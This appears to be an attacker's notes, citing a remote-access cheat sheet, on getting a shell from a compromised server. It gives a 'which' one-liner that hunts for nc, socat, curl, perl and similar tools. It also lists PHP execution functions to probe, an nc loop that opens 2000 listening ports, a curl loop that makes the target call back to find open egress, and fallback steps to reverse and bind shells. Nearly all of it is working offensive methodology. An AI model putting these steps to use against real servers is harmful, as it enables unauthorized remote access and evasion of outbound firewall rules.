<https://dolosgroup.io/blog/remote-access-cheat-sheet>

which is gold command
which which ls find python python3 perl bash sh dash xterm php jsp java asp socat\
nc ncat netcat nc.traditional nc.openbsd ruby wget curl fetch lua gawk awk tclsh 

### Methodology {#methodology}

    _ Keep it simple, test for very basic things.

    |________ Which languages are interpreted by the servers, try to upload some simple echo
    |        |____ Found php ? Check echo about system, passthru, shell_exec, exec to see if you can use them
    |________ Check commons binaries available on the system using which, locate, or by searching binaries 
             | at /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin
    |        |____ which which ls find python perl bash sh dash xterm php jsp java asp socat nc ncat 
                   netcat nc.traditional nc.openbsd ruby wget curl fetch lua gawk awk tclsh
    |
    |________ Try to get a reverse shell at port 443, then 80, if not working
    |        |
    |        |____ Open 2000 ports on your server using nc
    |        | for port in {1..2000};do nc -nlvp $port &;done
    |        |____ Ask the target server to connect to those ports
    |        |   for port in {1..2000};do curl -X GET http://IP:$port/user
    |        |         2>&1;done
    |        |____ Repeat until you iterated all ports
    |        |____ Reverse Shell on the port you've been hit
    |________ Still not working ? Go bind shell
             |_____ Test port 443, 80, then try the nc opening ports tricks by swapping the server/client role